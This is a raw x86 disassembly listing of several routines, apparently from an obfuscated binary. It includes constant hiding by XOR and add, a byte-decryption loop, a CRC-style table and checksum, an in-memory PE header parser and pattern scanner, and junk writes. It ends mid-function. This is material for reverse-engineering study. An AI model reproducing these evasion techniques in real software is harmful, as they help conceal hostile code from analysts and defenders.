  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
